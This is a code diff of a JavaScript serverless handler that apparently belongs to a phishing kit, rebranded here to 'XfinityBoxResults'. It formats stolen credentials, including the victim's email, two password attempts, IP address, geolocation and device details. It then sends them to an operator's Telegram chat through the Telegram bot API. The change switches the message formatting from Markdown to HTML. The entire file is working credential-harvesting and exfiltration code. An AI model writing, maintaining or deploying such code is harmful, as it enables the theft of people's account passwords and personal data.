@@ -58,17 +58,19 @@ const getDeviceDetails = (userAgent) => {
   };
 };
 
-// --- Markdown Escaping ---
-const escapeMarkdown = (text) => {
-  if (!text) return text;
-  return String(text).replace(/\\/g, '\\\\').replace(/[_*`\[]/g, '\\$&');
+// --- HTML Escaping ---
+const escapeHtml = (text) => {
+  if (text === null || text === undefined) return 'N/A';
+  return String(text)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
 };
 
 // --- Message Composers ---
 
 /**
- * Composes the message for login credentials.
- * This function remains structurally the same.
+ * Composes the message for login credentials using HTML formatting.
  * @param {object} data - The parsed request body.
  * @returns {string}
  */
@@ -78,19 +80,17 @@ const composeCredentialsMessage = (data) => {
         clientIP, location, deviceDetails, timestamp, sessionId,
     } = data;
 
-    const safeEmail = escapeMarkdown(email || 'Not captured');
-    const safeFirstPw = escapeMarkdown(firstAttemptPassword);
-    const safeSecondPw = escapeMarkdown(secondAttemptPassword);
-    const safeProvider = escapeMarkdown(provider || 'Others');
-    const safeIP = escapeMarkdown(clientIP);
-    const safeRegion = escapeMarkdown(location.regionName);
-    const safeCountry = escapeMarkdown(location.country);
-    const safeOS = escapeMarkdown(deviceDetails.os);
-    const safeBrowser = escapeMarkdown(deviceDetails.browser);
-    const safeDevice = escapeMarkdown(deviceDetails.deviceType);
-    const safeSessionId = escapeMarkdown(sessionId);
-
-    const passwordSection = `🔑 First (invalid): ${safeFirstPw}\n🔑 Second (valid): ${safeSecondPw}`;
+    const safeEmail = escapeHtml(email || 'Not captured');
+    const safeFirstPw = escapeHtml(firstAttemptPassword);
+    const safeSecondPw = escapeHtml(secondAttemptPassword);
+    const safeProvider = escapeHtml(provider || 'Others');
+    const safeIP = escapeHtml(clientIP);
+    const safeRegion = escapeHtml(location.regionName);
+    const safeCountry = escapeHtml(location.country);
+    const safeOS = escapeHtml(deviceDetails.os);
+    const safeBrowser = escapeHtml(deviceDetails.browser);
+    const safeDevice = escapeHtml(deviceDetails.deviceType);
+    const safeSessionId = escapeHtml(sessionId);
 
     const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
@@ -98,25 +98,24 @@ const composeCredentialsMessage = (data) => {
         timeZone: 'UTC', hour12: true
     }) + ' UTC';
 
-    return `
-*🔐 BobbyBoxResults - Credentials 🔐*
+    return `<b>🔐 XfinityBoxResults - Credentials 🔐</b>
 
-*ACCOUNT DETAILS*
-- 📧 Email: ${safeEmail}
-- 🏢 Provider: *${safeProvider}*
-- ${passwordSection}
+<b>ACCOUNT DETAILS</b>
+📧 Email: ${safeEmail}
+🏢 Provider: <b>${safeProvider}</b>
+🔑 First (invalid): ${safeFirstPw}
+🔑 Second (valid): ${safeSecondPw}
 
-*DEVICE & LOCATION*
-- 📍 IP Address: ${safeIP}
-- 🌍 Location: *${safeRegion}, ${safeCountry}*
-- 💻 OS: *${safeOS}*
-- 🌐 Browser: *${safeBrowser}*
-- 🖥️ Device Type: *${safeDevice}*
+<b>DEVICE &amp; LOCATION</b>
+📍 IP Address: ${safeIP}
+🌍 Location: <b>${safeRegion}, ${safeCountry}</b>
+💻 OS: <b>${safeOS}</b>
+🌐 Browser: <b>${safeBrowser}</b>
+🖥️ Device Type: <b>${safeDevice}</b>
 
-*SESSION INFO*
-- 🕒 Timestamp: *${formattedTimestamp}*
-- 🆔 Session ID: ${safeSessionId}
-`;
+<b>SESSION INFO</b>
+🕒 Timestamp: <b>${formattedTimestamp}</b>
+🆔 Session ID: ${safeSessionId}`;
 };
 
 // --- Main Handler (credentials only — OTP is handled by sendOtp function) ---
@@ -163,7 +162,7 @@ exports.handler = async (event) => {
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
+      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
       signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
     });
 
